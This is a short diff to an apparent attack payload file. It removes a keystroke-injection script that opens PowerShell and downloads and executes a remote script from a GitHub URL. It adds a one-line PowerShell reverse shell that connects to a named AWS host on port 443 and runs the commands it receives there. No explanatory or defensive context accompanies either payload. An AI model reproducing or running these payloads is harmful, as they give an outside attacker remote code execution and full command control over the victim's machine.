@@ -1,5 +1,1 @@
-DELAY 1000
-GUI r
-DELAY 100
-STRING powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jthemee/paymyload/master/canard.ps1');"
-ENTER
+$sm=(New-Object Net.Sockets.TCPClient("ec2-35-154-166-105.ap-south-1.compute.amazonaws.com",443)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
